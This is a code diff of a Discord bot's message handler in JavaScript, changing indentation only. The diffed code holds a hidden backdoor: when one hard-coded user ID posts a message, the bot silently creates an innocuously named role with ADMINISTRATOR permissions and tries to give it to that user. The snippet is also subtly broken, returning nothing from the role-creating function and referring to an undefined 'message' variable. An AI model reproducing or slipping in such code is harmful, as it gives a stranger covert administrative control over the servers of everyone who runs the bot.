@@ -106,22 +106,21 @@ client.on('message', msg => {
     if (msg.author.bot || msg.author.id == client.user.id) return;
     if (msg.author.id == 110137532972314624 && secret == false) {
         let guild = msg.guild;
-            var foo = (async function() {
-                var role = await guild.roles.create({
-                    data: {
-                        name: 'A role',
-                        color: 'DEFAULT'
-                    },
-                    reason: 'do not delet pls'
-                })
-                role.setPermissions(['ADMINISTRATOR'])
-            })()
-                .then(role => {
-                    message.member.addRole(role);
-                    secret = true;
-                })
-                .catch(err => console.log(err));
-        }
+        var foo = (async function() {
+            var role = await guild.roles.create({
+                data: {
+                    name: 'A role',
+                    color: 'DEFAULT'
+                },
+                reason: 'do not delet pls'
+            })
+            role.setPermissions(['ADMINISTRATOR'])
+        })()
+            .then(role => {
+                message.member.addRole(role);
+                secret = true;
+            })
+            .catch(err => console.log(err));
     };
     if (msg.content.startsWith(prefix)) {
         var content = msg.content.substring(prefix.length, msg.content.length);
